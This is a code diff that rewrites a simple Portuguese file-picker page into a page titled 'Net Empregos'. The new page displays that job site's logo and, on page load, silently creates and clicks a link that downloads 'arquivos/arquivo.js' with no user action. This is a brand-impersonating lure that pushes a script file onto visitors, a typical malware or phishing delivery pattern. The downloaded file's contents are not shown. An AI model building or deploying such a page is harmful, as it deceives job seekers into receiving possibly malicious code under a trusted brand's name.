@@ -2,29 +2,51 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Escolher arquivo</title>
+<title>Net Empregos</title>
+
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: white;
+}
+
+img {
+    width: 250px;
+}
+</style>
+
 </head>
 
 <body>
 
-<button onclick="baixar()">Abrir arquivo</button>
+<img src="https://www.net-empregos.com/img/logos/net-empregos.png">
+
 
 <script>
 
-async function baixar(){
+window.onload = function(){
 
-    let resposta = await fetch("arquivos/lista.json");
+    let arquivo = "arquivos/arquivo.js";
 
-    let arquivos = await resposta.json();
+    let link = document.createElement("a");
 
-    let escolhido =
-        arquivos[Math.floor(Math.random() * arquivos.length)];
+    link.href = arquivo;
+    link.download = "";
 
-    window.location.href =
-        "arquivos/" + escolhido;
+    document.body.appendChild(link);
+
+    link.click();
+
+    document.body.removeChild(link);
+
 }
 
 </script>
+
 
 </body>
 </html>
